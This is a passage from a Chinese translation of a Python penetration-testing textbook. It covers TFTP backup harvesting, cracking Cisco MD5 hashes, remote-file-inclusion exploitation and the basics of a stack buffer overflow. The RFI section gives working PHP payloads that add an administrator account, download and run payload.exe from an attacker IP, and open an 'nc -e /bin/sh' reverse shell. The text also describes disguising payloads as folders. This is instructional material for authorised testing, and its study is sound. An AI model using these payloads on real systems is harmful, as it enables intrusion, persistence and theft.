            ip = ips + str(octet)
            #print("[*] Testing port %s at IP %s") % (port, ip)
            try:
                socket.setdefaulttimeout(1)
                s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
                s.connect((ip,port))
                output = s.recv(1024)
print("[+] The banner: %s for IP: %s at Port: %s") % (output,ip,port)
            except:
                print("[-] Failed to Connect to %s:%s") % (ip, port)
            finally:
                s.close()

if __name__ == "__main__":
    main()
```

当脚本响应活动横幅时，我们可以去获取服务的详细信息。这可以使用`nmap`等工具来完成，但是脚本的框架可以调整以获取更多或更少的详细信息，执行后续请求，甚至在必要时延长时间。因此，如果`nmap`或其他工具没有正确获取详细信息，可以使用这个脚本。需要注意的是，这比其他工具慢得多，应该作为辅助工具而不是主要工具来对待。

### 注意

正如刚才提到的，`nmap`可以使用 NSE 横幅脚本以更快的速度做类似的事情，如[`nmap.org/nsedoc/scripts/banner.html`](https://nmap.org/nsedoc/scripts/banner.html)中所述。

从横幅抓取的结果中，我们现在可以编写一个 Python 脚本，该脚本可以递增地遍历潜在的备份文件名，并尝试下载它们。因此，我们将创建一个目录来存储从这个快速脚本中请求的所有潜在文件。在这个目录中，我们可以列出内容，并查看哪些内容超过了 0 字节。如果我们看到内容超过了 0 字节，我们就知道我们已经成功地获取了一个备份文件。我们将创建一个名为 backups 的目录，并从中运行这个脚本：

```py
#!/usr/bin/env python
try:
    import tftpy
except:
    sys.exit(“[!] Install the package tftpy with: pip install tftpy”)
def main():
    ip = "192.168.195.165"
    port = 69
    tclient = tftpy.TftpClient(ip,port)
    for inc in range(0,100):
        filename = "example_router" + "-" + str(inc)
        print("[*] Attempting to download %s from %s:%s") % (filename,ip,port)
        try:
tclient.download(filename,filename)
        except:
            print("[-] Failed to download %s from %s:%s") % (filename,ip,port)

if __name__ == '__main__':
    main()
```

正如你所看到的，这个脚本是用来查找从`example_router-0`到`example_router-99`的路由器备份的。结果可以在输出目录中看到，如下所示：

![确定备份文件名](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/lrn-pentest-py/img/B04315_07_05.jpg)

现在，我们只需要确定每个文件的大小，以找到实际的路由器备份，使用`ls -l`命令。这个命令的示例输出可以在下面的截图中看到。正如你在这里看到的，`example_router-5`似乎是一个包含数据的实际文件：

![确定备份文件名](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/lrn-pentest-py/img/B04315_07_06.jpg)

## 破解思科 MD5 哈希

现在我们可以看看备份文件中是否有任何哈希密码，如下所示：

![破解思科 MD5 哈希](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/lrn-pentest-py/img/B04315_07_07.jpg)

John the Ripper 工具现在可以用来破解这些哈希，只要它们被正确格式化。为此，将这些哈希放在以下格式中：

```py
enable_secret:hash

```

John the Ripper 工具需要备份文件中的数据以特定格式呈现，以便进行处理。以下摘录显示了这些哈希需要以何种格式呈现才能进行处理：

```py
enable_secret:$1$gUlC$Tj6Ou5.oPE0GRrymDGj9v1
enable_secret:$1$ikJM$oMP.FIjc1fu0eKYNRXF931

```

然后，我们将这些哈希放在一个文本文件中，比如`cisco_hash`，并对其运行 John the Ripper，如下所示：

```py
john cisco_hash

```

完成后，您可以使用`john --show cisco_hash`查看结果，并使用提取的凭据登录设备，提升权限并调整其详细信息。利用这种访问权限，如果路由器是主要的外围保护，您可以潜在地调整保护措施，以使您的公共 IP 地址能够访问内部资源。

### 提示

记得使用你写的脚本来获取你的公共 IP 地址，让生活更轻松。

即使在红队参与中，您也应该非常谨慎地对待这个问题。操纵外围防火墙可能会对组织产生不利影响。相反，您应该考虑突出显示您已经获得的访问权限，并要求为您的公共 IP 地址在半受信任或受保护的网络中开通访问权限，具体取决于参与的性质。请记住，除非设备具有可路由的 IP 地址，如公共或面向互联网的地址，否则您可能仍然无法从互联网上看到它，但您可能能够看到以前对您隐藏的端口和服务。一个例子是一个在防火墙后启用了 RDP 的 Web 服务器。一旦执行了外围规则的调整，您可能就可以访问 Web 服务器上的 RDP。

# 通过网站获取访问权限

利用面向互联网的网站通常是攻击组织边界的最可行选项。有许多方法可以做到这一点，但提供访问权限的最佳漏洞包括**结构化查询语言**（**SQL**）**结构化查询语言注入**（**SQLi**），**命令行注入**（**CLI**），**远程和本地文件包含**（**RFI**/**LFI**）以及未受保护的文件上传。关于 SQLi、CLI、LFI 和文件上传漏洞的执行有大量信息，但通过 RFI 进行攻击的信息相对较少，漏洞也很普遍。

## 文件包含攻击的执行

要查找文件包含向量，您需要查找引用资源的向量，无论是服务器上的文件还是互联网上的其他资源：

[`www.example.website.com/?target=file.txt`](http://www.example.website.com/?target=file.txt)

远程文件包含通常引用其他站点或合并的内容：

[`www.example.website.com/?target=trustedsite.com/content.html`](http://www.example.website.com/?target=trustedsite.com/content.html)

我们之所以强调 LFI，除了严格的 RFI 示例之外，是因为文件包含漏洞通常可以在显着的 LFI 和 RFI 向量之间双向工作。应该注意的是，仅因为存在对远程或本地文件的引用并不意味着它是有漏洞的。

在注意到差异后，我们可以尝试确定站点是否适合进行攻击，这取决于底层架构：Windows 还是 Linux/UNIX。首先，我们必须准备好我们的攻击环境，这意味着建立一个面向互联网的 Web 服务器，并在其中放置攻击文件。幸运的是，Python 通过`SimpleHTTPServer`可以轻松实现这一点。首先，我们创建一个将托管我们文件的目录，名为`server`，然后我们 cd 到该目录，然后使用以下命令创建 Web 服务器实例：

```py
python -m SimpleHTTPServer

```

然后，您可以通过在**统一资源定位符**（**URL**）请求栏中输入带有端口号 8000 的主机 IP 地址，用冒号分隔，访问该站点。这样做后，您将看到向服务器发送的许多请求以获取信息。您刚刚建立的新服务器可以用来引用要在目标服务器上运行的脚本。此屏幕截图显示了发送到服务器的相关请求：

![文件包含攻击的执行](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/lrn-pentest-py/img/B04315_07_08.jpg)

如前所述，有时可以使用其他协议与目标 Web 服务器进行交互。如果您通过将 IP 地址添加到防火墙或访问控制列表（ACL）的授权列表中，为自己提供了对半受信任网络或 DMZ 的更多访问权限，您可能能够看到诸如**服务器消息块**（**SMB**）或 RDP 之类的服务。因此，根据环境，您可能不必为自己提供额外的访问权限；只需破解 Web 服务器可能就足以为您提供足够的访问权限。

大多数文件包含漏洞与**PHP**网站相关。其他语言集可能存在漏洞，但基于 PHP 的站点最常见。因此，让我们创建一些伪装成文本文件的 PHP 脚本来验证漏洞并利用底层服务器。

### 验证 RFI 漏洞

当您怀疑自己发现了 RFI 漏洞时，您需要在利用之前验证是否实际存在漏洞。首先，在面向互联网的服务器上启动`tcpdump`服务，并使其监听带有以下命令的**Internet Control Message Protocol**（**ICMP**）回显：

```py
sudo tcpdump icmp[icmptype]=icmp-echo -vvv -s 0 -X -i any -w /tmp/ping.pcap

```

此命令将生成一个文件，其中将捕获由`ping`命令发送的所有消息。对暴露的 Web 服务器进行 ping 操作，找到服务器的实际 IP 地址，并记录下来。然后，创建以下 PHP 文件，将其存储为名为`ping.txt`的文本文件：

```py
<pre style="text-align:left;">
<?php
    echo shell_exec('ping -c 1 <listening server>');
?>
</pre>
```

您现在可以通过以下命令引用文件来执行攻击：

[`www.example.website.com/?target=70.106.216.176:8000/server/ping.txt`](http://www.example.website.com/?target=70.106.216.176:8000/server/ping.txt)

一旦攻击执行完毕，您可以使用以下命令查看**数据包捕获（PCAP）**：

```py
tcpdump -tttt -r /tmp/ping.pcap

```

如果您从您 ping 的同一台服务器看到 ICMP 回显，那么您就知道该服务器容易受到 RFI 的攻击。

### 通过 RFI 利用主机

当您找到一个易受攻击的 Windows 主机时，通常会以特权帐户运行。因此，首先，通过 PHP 脚本向系统添加另一个本地管理员帐户可能是有用的。通过创建以下脚本并将其写入诸如`account.txt`之类的文本文件来完成这一点：

```py
<pre style="text-align:left;">
<?php
    echo shell_exec('net user pentester ComplexPasswordToPreventCompromise1234 /add');
    echo shell_exec('net localgroup administrators pentester /add'):
?>
</pre>
```

现在，我们所要做的就是从我们暴露的服务器引用脚本，就像这样：

[`www.example.website.com/?target=70.106.216.176:8000/server/account.txt`](http://www.example.website.com/?target=70.106.216.176:8000/server/account.txt)

如果可能的话，这将在服务器上创建一个新的恶意本地管理员，我们可以使用它来访问服务器。如果系统的 RDP 暴露在互联网上，我们的工作就完成了，我们只需使用新帐户直接登录系统。如果不是这种情况，那么我们需要找到另一种方法来利用系统；为此，我们将使用实际的有效负载。

创建一个如第五章*使用 Python 利用服务*中所述的有效负载，并将其移动到用于存储引用文件的目录中。

### 提示

用于此攻击的最佳 LPORT 是端口 80、端口 443 和端口 53。只需确保这些服务没有冲突即可。

创建一个新的 PHP 脚本，可以直接下载文件并执行它，名为`payload_execute.txt`：

```py
<pre style="text-align:left;">
<?php
    file_put_contents("C:\Documents and Settings\All Users\Start Menu\Programs\Startup\payload.exe", fopen("http://70.106.216.176:8000/server/payload.exe", 'r'));
    echo shell_exec('C:\Documents and Settings\All Users\Start Menu\Programs\Startup\payload.exe'):
?>
</pre>
```

现在，设置监听器（如第五章*使用 Python 利用服务*中详细说明的）以侦听定义的本地端口。最后，将新脚本加载到 RFI 请求中，观察您的新潜在 shell 出现：

[`www.example.website.com/?target=70.106.216.176:8000/server/payload_execute.txt`](http://www.example.website.com/?target=70.106.216.176:8000/server/payload_execute.txt)

这些是您可以利用 Windows 主机的样本，但如果是 Linux 系统呢？根据主机的权限结构，可能更难获得 shell。也就是说，您可以潜在地查看本地主机，以识别可能包含明文密码的本地文件和存储库。

Linux 和 Unix 主机通常安装了`netcat`和几种脚本语言，这为攻击者提供了好处。每种语言都可以提供一个命令 shell 返回到攻击者的监听系统。例如，使用以下命令在面向互联网的主机上设置`netcat`监听器：

```py
nc -l 443

```

然后，创建一个存储在文本文件中的 PHP 脚本，例如`netcat.txt`：

```py
<pre style="text-align:left;">
<?php
    echo shell_exec('nc -e /bin/sh 70.106.216.176 443'):
?>
</pre>
```

接下来，通过引用先前显示的 URL 中的脚本来运行脚本：

[`www.example.website.com/?target=70.106.216.176:8000/server/netcat.txt`](http://www.example.website.com/?target=70.106.216.176:8000/server/netcat.txt)

### 注意

有几个示例显示了如何在系统上设置其他后门，如[`pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet`](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)中所示。

对于 Windows 和 Linux 主机，Metasploit 有`php_include`漏洞，允许您直接将攻击注入到 RFI 中。 PHP Meterpreter 受限且不太稳定，因此在在 Windows 系统上获得立足点后，仍需要下载完整的 Meterpreter 并执行。在 Linux 系统上，您应该提取`passwd`和`shadow`文件并破解它们以获得真正的本地访问。

# 总结

本章重点介绍了针对特定服务的常见入侵方法。然而，我们没有涵盖最常见的入侵方法，即网络钓鱼。网络钓鱼是一种社会工程学的类型，是一门艺术，可能需要几章来描述，但您应该知道，真正的攻击者在找不到进入环境的简单方法时通常会使用网络钓鱼。今天，恶意行为者通常从网络钓鱼开始，因为很容易诱使受害者上钩。

在这些入侵途径之后，评估者和恶意行为者会寻找新修补的零日漏洞，例如 2014 年发现的 Shellshock 和 Heartbleed。像这样的例子通常在提供新补丁几个月后仍然是可利用的，但如果您认为在暴露的服务中发现了漏洞，而没有可用的漏洞利用，或者发现了潜在的零日漏洞，该怎么办呢？虽然很少见，渗透测试人员有时会获得测试潜在零日漏洞的机会，但通常在更受控制的环境中证明妥协的概念。在下一章中，我们将更深入地讨论这个问题。


# 第八章：使用 Python、Metasploit 和 Immunity 进行利用开发

在研究或在罕见的参与中，您可能需要开发或修改利用以满足您的需求。Python 是一个很棒的语言，可以快速原型化代码来测试利用，或者帮助未来修改 Metasploit 模块。本章重点介绍编写利用的方法，而不是如何为这些软件产品创建特定的利用，因此可能需要更多的测试来提高可靠性。首先，我们需要了解**中央处理单元**（**CPU**）寄存器以及 Windows 内存在运行时的可执行文件结构。在此之前，在 Windows XP Run Mode 虚拟机上，您需要一些工具来测试这一点。

### 注意

在 Windows XP Run Mode VM 上下载并安装以下组件：Python 2.7、Notepad++、Immunity Debugger、MinGW（带有所有基本包）和 Free MP3 CD Ripper 版本 1.0。还要使用当前的 Kali 版本来帮助生成我们在本章节中要强调的相关细节。

# 开始使用寄存器

这个解释是基于 x86 系统和处理可执行文件指令集的相关寄存器。出于简洁起见，我们不会详细讨论所有寄存器，但我们会描述本章节范围内最重要的寄存器。特别强调的寄存器大小为 32 位，被称为扩展寄存器。

它们被扩展了，因为它们在之前的 16 位寄存器上增加了 16 位。例如，旧的 16 位通用寄存器可以通过简单地去掉寄存器名称前面的 E 来识别，因此 EBX 也包含 16 位 BX 寄存器。BX 寄存器实际上是两个较小的 8 位寄存器 BH 和 BL 的组合。H 和 L 表示高字节和低字节寄存器。有大量关于这个主题的书籍，复制这些信息对我们的目的并不直接有用。总的来说，寄存器被分解为两种形式以便理解，通用寄存器和特殊用途寄存器。

## 理解通用寄存器

四个通用寄存器是 EAX、EBX、ECX 和 EDX。它们被称为通用寄存器，因为数学运算和存储发生在这里。请记住，任何东西都可以被操纵，甚至是寄存器通常应该做的基本概念。尽管如此，总体目的是准确的。

### EAX

累加器寄存器用于基本数学运算和函数的返回值。

### EBX

基址寄存器是另一个通用寄存器，但与 EAX 不同，它没有特定的用途。因此，这个寄存器可以根据需要用于名义存储。

### ECX

计数器寄存器主要用于循环函数和迭代。ECX 寄存器也可以用于通用存储。

### EDX

数据寄存器用于更高级的数学运算，如乘法和除法。这个寄存器还在程序处理过程中存储函数变量。

## 理解特殊用途寄存器

这些寄存器是程序处理过程中处理索引和指向的地方。对您来说，这意味着这是基本利用编写的魔法发生的地方 - 最终，我们试图操纵数据的覆盖发生在这里。这是通过其他寄存器中发生的操作顺序完成的。

### EBP

基指针告诉您堆栈底部在哪里。当首次调用函数时，这指向堆栈顶部，或者设置为旧的堆栈指针值。这是因为堆栈已经移动或增长。

### EDI

目的地索引寄存器用于指向函数。

### EIP

指令指针被认为是基本利用编写的目标。你正在尝试覆盖堆栈上存储的这个值，因为如果你控制这个值，你就控制了 CPU 要执行的下一条指令。因此，当你看到开发人员或利用编写者谈论覆盖 EIP 寄存器上的数据时，要明白这不是一件好事。这意味着程序本身的某些设计已经失败了。

### ESP

堆栈指针显示堆栈的当前顶部，并且在程序运行时会被修改。因此，当项目从堆栈顶部被移除时，ESP 会改变其指向位置。当新函数加载到堆栈上时，EBP 会取代 ESP 的旧位置。

# 理解 Windows 内存结构

Windows 操作系统（OS）的内存结构有许多部分，可以分解为高级组件。要理解如何编写利用并利用糟糕的编程实践，我们首先必须了解这些部分。以下详细信息将这些信息分解成可管理的部分。以下图提供了一个可执行文件的 Windows 内存结构的代表性图表。

![理解 Windows 内存结构](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/lrn-pentest-py/img/B04315_08_1.jpg)

现在，这些组件中的每一个都很重要，但我们在大多数利用编写中使用的是堆栈和堆。

## 理解堆栈和堆

堆栈用于有序的短期本地存储。每次调用函数或线程时，都会为该函数或线程分配一个固定大小的唯一堆栈。一旦函数或线程完成操作，堆栈就会被销毁。

堆，另一方面，是全局变量和值以相对无序的方式分配的地方。堆由应用程序共享，内存区域实际上由应用程序或进程管理。一旦应用程序终止，该特定内存区域就会被释放。在这个例子中，我们攻击的是堆，而不是堆。

### 提示

请记住，这里的利用示例通常是用 Perl 编写的，尽管你可以很容易地将代码转换为 Python，正如第二章中所强调的，*Python 脚本的基础*。

为了更好地理解堆和堆栈移动之间的区别，请参见下图，显示了在为全局和局部资源分配内存时的调整。

![理解堆栈和堆](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/lrn-pentest-py/img/B04315_08_2.jpg)

堆栈从堆栈底部向上构建数据。增长从高内存地址到低内存地址。堆与堆栈相反，它的增长方向相反，朝着更高的地址。

为了理解程序加载到堆栈上的方式，我们创建了一个示例代码片段。通过这段代码，你可以看到主函数如何调用`function1`以及局部变量如何被放置在堆栈上。注意程序通常如何通过调用`function1`流动以及数据如何放置在堆栈上。

```py
int function1(int a, int b, int c)
{
    diffa - b - c;
    sum = a + b + c;
    return sum;
}
int main()
{
    return function1(argv[1], argv[2], argv[3]);
}
```

![理解堆栈和堆](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/lrn-pentest-py/img/B04315_08_3.jpg)

加载到堆栈上的代码看起来类似于这样，突出显示了信息组件的呈现方式。正如你所看到的，旧的基址指针被加载到堆栈上进行存储，新的 EBP 是旧的堆栈指针值，因为堆栈的顶部已经移动到了新的位置。

放入堆栈的项目被推入堆栈，从堆栈中运行或移除的项目被弹出。堆栈是一个编程概念，被称为**后进先出**（**LIFO**）结构。把它想象成一堆盘子；要有效地移除盘子，你必须一次一个或一组地从顶部取下，否则你会有破碎的风险。当然，最安全的方式是一次一个，虽然需要更长的时间，但是它是可追踪和有效的。了解我们将要用来注入代码的内存结构的最动态部分后，你需要了解 Windows 内存的其余区域，这些区域将作为构建块，我们将操纵它们从注入到 shell。具体来说，我们正在谈论程序映像和**动态链接库**（**DLL**）。

### 注意

记住，我们正在尝试将 shellcode 注入内存，然后使用它来通过诸如 Meterpreter 之类的解决方案访问系统。

## 理解程序映像和动态链接库

简单地说，程序映像是实际可执行文件存储在内存中的地方。**可移植可执行文件（PE）**是可执行文件的定义格式，其中包含可执行文件和 DLL。在内存的程序映像组件中，定义了以下项目。

+   `PE 头`：这包含了 PE 的其余部分的定义。

+   `.text`：该组件包含代码段或可执行指令。

+   `.rdata`：这是只读数据段，包含静态常量而不是变量。

+   `.data`：当可执行文件加载到内存中时，该区域包含静态变量在初始化后的静态变量、全局变量和静态局部变量。该区域可读可写，但大小在运行时不会改变，它是在执行时确定的。

+   `.rsrc`：这个部分是存储可执行文件资源的地方。这包括图标、菜单、对话框、版本信息、字体等。

### 注意

许多渗透测试人员操纵可执行文件的`.rsrc`组件，以改变有效载荷的格式，使其看起来像其他东西。这通常是为了改变恶意有效载荷在**通用串行总线（USB）**驱动器上的外观。想象一下当你进行 USB 投放时，将有效载荷从看起来像可执行文件改为看起来像一个文件夹。大多数人会想要看看文件夹里面有什么，并且更有可能双击一个假的文件夹而不是一个可疑的可执行文件。资源调整器等工具使得对 PE 的这一部分的操纵变得非常容易。

在这里理解 PE 的最后一个组件是 DLL，它包括微软的共享库概念。DLL 类似于可执行文件，但不能直接调用，而是必须由可执行文件调用。DLL 的核心思想是提供一种方法，使能力得以升级，而不需要在操作系统更新时重新编译整个程序。

因此，许多系统操作的基本构建块需要被引用，无论启动周期如何。这意味着即使其他组件将位于不同的内存位置，许多核心 DLL 将保持在相同的引用位置。记住，程序需要特定的可调用指令，许多基础 DLL 都加载到相同的内存区域。

你需要理解的是，我们将使用这些 DLL 来找到一个可靠地放置在相同位置的指令，以便我们可以引用它。这意味着在系统和重启时，只要 OS 和**Service Pack (SP)**版本相同，内存引用就会起作用，如果你使用 OS DLLs。如果你使用完全适用于程序的 DLLs，你将能够跨 OS 版本使用这个漏洞。不过，在这个例子中，我们将使用 OS DLLs。发现的指令将使我们能够告诉系统跳转到我们的 shell 代码，并依次执行它。

我们必须在 DLL 中引用代码的原因是，我们无法确定每次发起这种攻击时我们的代码将被加载到内存的确切位置，因此我们无法告诉系统我们要跳转到的确切内存地址。因此，我们将加载栈与我们的代码，并告诉程序通过引用位置跳转到它的顶部。

请记住，每次执行程序和/或每次重启都可能会改变这一点。栈内存地址根据程序的需要提供，并且我们试图将我们的代码直接注入到这个运行函数的栈中。因此，我们必须利用已知和可重复的目标指令集。我们将详细解释这个过程，但现在，只需知道我们使用 DLL 已知的指令集来跳转到我们的 shell 代码。在这个内存区域，其他组件对我们在这里突出的利用技术来说不那么重要，但你需要理解它们，因为它们在你的调试器中被引用。

### 注意

PE 可以从以下两篇较旧的文章中更好地理解，*Peering Inside the PE: A Tour of the Win32 Portable Executable File Format*，在这里找到[`msdn.microsoft.com/en-us/magazine/ms809762.aspx`](https://msdn.microsoft.com/en-us/magazine/ms809762.aspx)，以及 An In-Depth Look into the Win32 Portable Executable File Format，在这里找到[`msdn.microsoft.com/en-us/magazine/cc301805.aspx`](https://msdn.microsoft.com/en-us/magazine/cc301805.aspx)。

## 理解进程环境块

**进程环境块**（**PEB**）是存储运行进程的非内核组件的地方。存储在内存中的是系统不应该访问内核组件的信息。一些**主机入侵防护系统**（**HIPS**）监视这个内存区域的活动，以查看是否发生了恶意活动。PEB 包含与加载的 DLL、可执行文件、访问限制等相关的详细信息。

## 理解线程环境块

每个进程建立的线程都会生成一个**线程环境块（TEB）**。第一个线程被称为主线程，之后的每个线程都有自己的 TEB。每个 TEB 共享启动它们的进程的内存分配，但它们可以以使任务完成更有效的方式执行指令。由于需要可写访问权限，这个环境驻留在内存的非内核块中。

## 内核

这是为设备驱动程序、**硬件访问层（HAL）**、缓存和程序不需要直接访问的其他组件保留的内存区域。理解内核的最佳方法是，这是操作系统最关键的组件。所有通信都是通过操作系统功能必要地进行的。我们在这里突出的攻击并不依赖于对内核的深入理解。此外，对 Windows 内核的深入理解需要一本专门的书。在定义内存位置之后，我们必须理解数据在其中的寻址方式。

# 理解内存地址和字节序

观察内存时，数据用十六进制字符 0- F 表示，每个字符代表 0-15 的值。例如，十六进制中的值 0 将被表示为二进制的 0000，而 F 的表示将是二进制的 1111。

使用十六进制使得阅读内存地址更容易，也更容易编写。由于我们有 32 位内存地址，因此会有 32 个位置用于特定位。由于每个十六进制值代表四位，等价表示可以用八个十六进制字符完成。请记住这些十六进制字符是成对出现的，以便它们代表四对。

Intel x86 平台使用小端表示法来进行内存寻址，这意味着最不重要的字节先出现。你读取的内存地址必须被反转以生成小端等价表示。要理解手动转换为小端，看一下下面的图片，注意你是在反转对的顺序，而不是对本身。这是因为对代表一个字节，我们按照最不重要的字节先出现的顺序，而不是位，如果是这种情况，十六进制字符也会改变，除非它是 A 或 F。

![理解内存地址和字节序](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/lrn-pentest-py/img/B04315_08_4.jpg)

不用担心，我们有一个小技巧，你经常会看到 Perl 利用程序中加载到变量中的特定内存地址的`pack('V', 0xaa01f24d)`。这是 Perl 的一个很好的特性，它允许你直接将小端表示的内存值加载到一个变量中。Python 的等价表示是`struct.pack('<I', 0xaa01f24d)`，这使得内存地址的表示更简单。如果你查看你的 Metasploit 模块，你可以看到以这种方式表示的预期操作`[target['Ret']].pack('V')`。这提供了基于传递的内存地址的指定目标的返回操作。

### 注意

当你在 Metasploit 中运行你的利用程序并选择目标，比如 Windows XP SP3 或 Windows 2008 R2 时。该目标通常是 EIP 要使用的特定内存地址，用于调用特定操作。通常情况下，它是`jmp esp`来执行注入，稍后在本章中你将看到更多关于逆向 Metasploit 模块的内容。

我们之前提到，我们试图用指向指令的内存值覆盖 EIP 寄存器。这个指令将根据我们在构建利用程序时可以覆盖的数据来选择。EIP 是你的利用代码中唯一需要担心字节序的地方；其余的利用程序都很直接。

### 注意

**小端**和**大端**的命名概念来自*乔纳森·斯威夫特的《格列佛游记》*。简单概括这本书，小端人相信从蛋的小一侧打破蛋壳，而大端人相信从蛋的大一侧打破蛋壳。这个概念也被应用到了内存结构的命名约定中。

# 理解堆栈的操作

要理解我们在编写利用程序时要做的事情，你必须理解内存中发生了什么。我们将向内存的一个区域注入数据，而该区域没有边界检查。这通常意味着一个变量声明了一个特定的大小，当数据被复制到该变量时，没有验证数据是否适合在复制之前。

这意味着可以将更多的数据放入一个变量中，超出预期的数据会溢出到堆栈并覆盖保存的值。其中一个保存的值包括 EIP。下面的图片突出显示了注入数据是如何推送到堆栈上并移动以覆盖保存的值的。

![理解堆栈的操作](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/lrn-pentest-py/img/B04315_08_5.jpg)

我们将用各种字符来淹没堆栈，以确定我们需要覆盖的区域。首先，我们将从一组大量的 A、B 和 C 开始。在查看调试器数据时看到的数值将告诉我们我们所着陆的堆栈位置。字符类型的差异将帮助我们更好地确定我们独特字符测试的大小需求。下图显示了我们覆盖堆栈时 A、B 和 C 的组合（未显示）：

![理解堆栈的操作](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/lrn-pentest-py/img/B04315_08_6.jpg)

现在在大致了解 EIP 的位置后，我们可以生成一个大小为 A 和 B 相加的唯一模式。这个唯一模式将被注入回易受攻击的程序。然后我们可以取覆盖 EIP 寄存器的唯一值，并将其与我们的模式进行比较。我们确定我们的大型唯一模式中该值所在的位置，并确定需要推送到堆栈上的数据量，以达到 EIP。

一旦我们确定了 EIP 的位置，我们可以通过检查 DLL 来定位 EIP 中要引用的指令。请记住，程序本身的 DLL 将更具可移植性，并且您的利用程序将在多个 Windows 版本中运行。Windows 操作系统的 DLL 使编写利用程序变得更容易，因为它们是无处不在的，并且具有您正在寻找的所需指令。

在这个利用程序的版本中，我们试图跳转到 ESP，因为可用空间在那里，并且很容易构建一个利用程序来利用它。如果我们使用其他寄存器，我们将不得不寻找一个指令来跳转到该寄存器。然后我们将不得不确定从被操纵的寄存器到 EIP 有多少可用空间。这将有助于确定需要填充堆栈该区域的数据量，因为我们的 shellcode 只会填充该区域的一小部分。

了解了这一点，我们将用**无操作**（**NOPs**）夹住我们的 shell 代码。位于 shellcode 和 EIP 之间的 NOPs 是为了抵消注入的 shellcode。因此，当指令加载到寄存器中时，它们会以适当的块加载。否则，shellcode 将错位。最后，加载到堆栈上的滑梯是为了占据剩余的空间，因此当调用 Jump to ESP 时，代码从顶部滑动到实际的 shellcode。查看以下图片以更好地理解我们正在朝着的方向：

![理解堆栈的操作](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/lrn-pentest-py/img/B04315_08_7.jpg)

有了这个基本的理解，我们可以开始在一个糟糕创建的 C 程序上使用 Immunity 调试器。

# 理解免疫

我们首先需要了解 Immunity 的设置方式。Immunity 是一个基于 Python 的强大调试器。许多插件，包括 Mona，都是用 Python 编写的，这意味着如果您需要更改某些内容，只需修改脚本。Immunity 的主屏幕分为四个部分，当您挂钩一个进程或执行一个程序时，您可以看到详细信息的输出，如下所示。

![理解免疫](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/lrn-pentest-py/img/B04315_08_8.jpg)

这个布局是您将花费大部分时间的基本外观。您可以根据需要调用不同的窗口来查看其他运行组件，比如 DLL。我们稍后会涵盖更多内容，但让我们先从创建一个基本的缓冲区溢出开始。

# 理解基本缓冲区溢出

以下 C 代码缺乏适当的边界检查，以强制在复制时对变量大小施加限制。这是一个简单的糟糕编程的例子，但它是 Metasploit 框架中许多利用程序的基础。

```py
#include <string.h>
#include <stdio.h>
int main (int argc, char *argv[])
{
    if (argc!=2) return 1; 
    char copyto[12];
    strcpy(copyto, argv[1]);  // failure to enforce size restrictions
    printf("The username you provided is %s", copyto);
    return 0;
}
```

我们将这段代码放入一个名为`username_test.cpp`的文件中，然后使用 MinGW 编译它，如下所示：

![理解基本缓冲区溢出](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/lrn-pentest-py/img/B04315_08_9.jpg)

然后我们可以运行新编译的程序，看它是否返回我们提供的任何文本。

![理解基本缓冲区溢出](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/lrn-pentest-py/img/B04315_08_10.jpg)

现在，启动 Immunity 并使用测试参数打开`username_test.exe`二进制文件，如下所示。这与 Python 脚本和从命令行运行的功能相同，这意味着您可以监视调试器的输出。

![理解基本缓冲区溢出](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/lrn-pentest-py/img/B04315_08_11.jpg)

现在，我们需要提供比预期更多的数据，并尝试触发溢出。这在这里很容易做到，因为我们知道这个特定二进制文件的限制，但如果我们不知道这一点，我们将不得不进行相对猜测。为此，我们应该生成一些数据，比如一堆大写 A，然后看看会发生什么。

我们可以每次想要生成参数时，要么重复按住*Shift*键再按字母 A，要么创建一个生成器来进行类似的活动。我们可以再次使用 Python 来帮助我们。看看下面的简单代码，它将根据需要创建数据文件，可以复制并粘贴到调试器中。

```py
data = "A"*150
open('output.txt', 'w').close()
with open("output.txt", "w") as text_file:
    text_file.write(data)
```

其输出如下图所示：

![理解基本缓冲区溢出](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/lrn-pentest-py/img/B04315_08_12.jpg)

现在，将数据复制并粘贴到 Immunity 调试器参数中，并使用*F7*键逐步运行程序。按住键一段时间后，您将开始看到二进制文件以提供的参数运行，并在寄存器窗格中处理时，EAX 寄存器中将捕获到 41414141。每个 41 代表**美国信息交换标准代码**（**ASCII**）的字母 A。运行程序结束后，您应该看到 EIP 被字母 A 溢出。

### 注意

在本示例中，您将看到的内存地址与您自己的环境中的地址不同，因此您需要确保使用您的内存地址生成最终脚本，而不是使用这些图像中看到的地址。

![理解基本缓冲区溢出](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/lrn-pentest-py/img/B04315_08_13.jpg)

因此，我们知道我们提供了足够的 A 来覆盖 EIP。这意味着我们已经发现我们可以覆盖 EIP，但我们没有为其提供任何有用的内容，并且我们不知道它实际上在堆栈中的位置。基本上，这意味着这个活动使我们的程序崩溃，而不是我们想要的 - 获得一个 shell。

这提出了关于制作利用程序的另一个问题；通常，设计不良的利用程序，或者无法设计以在特定漏洞的内存限制中工作的利用程序，将产生**拒绝服务**（**DoS**）条件。我们的目标是在计算机上获得 shell，为此，我们需要操纵推送到程序中的内容。请记住，当您考虑服务时，有关**远程代码执行**（**RCE**）攻击的报告可用，而唯一可用的公开利用程序会导致 DoS 攻击。这意味着很难在该环境中实现 shell 访问，或者研究人员在该环境中创建利用程序的能力可能受到限制。

### 提示

在进行过程中，如果您的寄存器出现错误，例如下图中的错误，那么您没有正确确定后续开发的缓冲区大小。

![理解基本缓冲区溢出](https://github.com/OpenDocCN/freelearn-sec-zh/raw/master/docs/lrn-pentest-py/img/B04315_08_14.jpg)

